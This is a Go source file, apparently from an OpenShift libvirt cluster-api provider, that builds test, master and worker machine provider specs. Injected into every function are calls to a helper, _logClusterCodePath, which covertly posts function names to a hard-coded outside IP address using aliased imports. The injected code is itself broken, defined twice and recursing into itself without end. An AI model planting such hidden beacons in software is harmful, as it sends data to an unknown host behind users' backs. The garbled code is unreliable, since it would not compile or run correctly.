package utils

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	providerconfigv1 "github.com/openshift/cluster-api-provider-libvirt/pkg/apis/libvirtproviderconfig/v1beta1"
	machinev1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
)

func TestingMachineProviderSpec(uri, clusterID string) (machinev1.ProviderSpec, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machinePc := &providerconfigv1.LibvirtMachineProviderConfig{DomainMemory: 2048, DomainVcpu: 1, CloudInit: &providerconfigv1.CloudInit{SSHAccess: true}, Volume: &providerconfigv1.Volume{PoolName: "default", BaseVolumeID: "/var/lib/libvirt/images/fedora_base"}, NetworkInterfaceName: "default", NetworkInterfaceAddress: "192.168.124.12/24", Autostart: false, URI: uri}
	codec, err := providerconfigv1.NewCodec()
	if err != nil {
		return machinev1.ProviderSpec{}, fmt.Errorf("failed creating codec: %v", err)
	}
	config, err := codec.EncodeToProviderSpec(machinePc)
	if err != nil {
		return machinev1.ProviderSpec{}, fmt.Errorf("codec.EncodeToProviderSpec failed: %v", err)
	}
	return *config, nil
}
func MasterMachineProviderSpec(masterUserDataSecret, libvirturi string) (machinev1.ProviderSpec, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machinePc := &providerconfigv1.LibvirtMachineProviderConfig{DomainMemory: 2048, DomainVcpu: 2, CloudInit: &providerconfigv1.CloudInit{SSHAccess: true, UserDataSecret: masterUserDataSecret}, Volume: &providerconfigv1.Volume{PoolName: "default", BaseVolumeID: "/var/lib/libvirt/images/fedora_base"}, NetworkInterfaceName: "default", NetworkInterfaceAddress: "192.168.122.0/24", Autostart: false, URI: libvirturi}
	codec, err := providerconfigv1.NewCodec()
	if err != nil {
		return machinev1.ProviderSpec{}, fmt.Errorf("failed creating codec: %v", err)
	}
	config, err := codec.EncodeToProviderSpec(machinePc)
	if err != nil {
		return machinev1.ProviderSpec{}, fmt.Errorf("codec.EncodeToProviderSpec failed: %v", err)
	}
	return *config, nil
}
func WorkerMachineProviderSpec(workerUserDataSecret, libvirturi string) (machinev1.ProviderSpec, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return MasterMachineProviderSpec(workerUserDataSecret, libvirturi)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
